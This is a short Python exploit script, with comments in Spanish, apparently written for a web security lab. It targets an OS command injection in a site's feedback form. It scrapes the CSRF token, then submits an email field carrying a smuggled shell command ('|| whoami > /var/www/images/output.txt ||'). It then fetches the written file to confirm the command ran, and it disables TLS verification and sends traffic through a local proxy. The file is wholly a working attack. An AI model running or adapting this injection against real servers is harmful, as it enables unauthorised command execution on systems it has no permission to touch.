import requests
from bs4 import BeautifulSoup
import sys
import urllib3

# Configuración inicial
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_command_injection(url):
    with requests.Session() as s:
        s.verify = False
        s.proxies = proxies

        # Obtener CSRF token
        response = s.get(f'{url}/feedback')
        soup = BeautifulSoup(response.content, 'html.parser')
        csrf_token = soup.find('input', {'name': 'csrf'})['value']
        
        # Realizar inyección de comandos
        data = {
            'csrf': csrf_token,
            'name': 'test',
            'email': "test@example.com || whoami > /var/www/images/output.txt ||",
            'subject': 'Command Injection',
            'message': 'This is a test'
        }
        s.post(f'{url}/feedback/submit', data=data)
        print("[+] Exploit enviado.")

        # Verificar si el exploit fue exitoso
        response = s.get(f'{url}/images/output.txt')
        if response.status_code == 200:
            print("Exploit exitoso, respuesta del servidor:")
            print(response.text)
        else:
            print("El exploit no tuvo éxito.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <url>")
        sys.exit(1)
    exploit_command_injection(sys.argv[1])

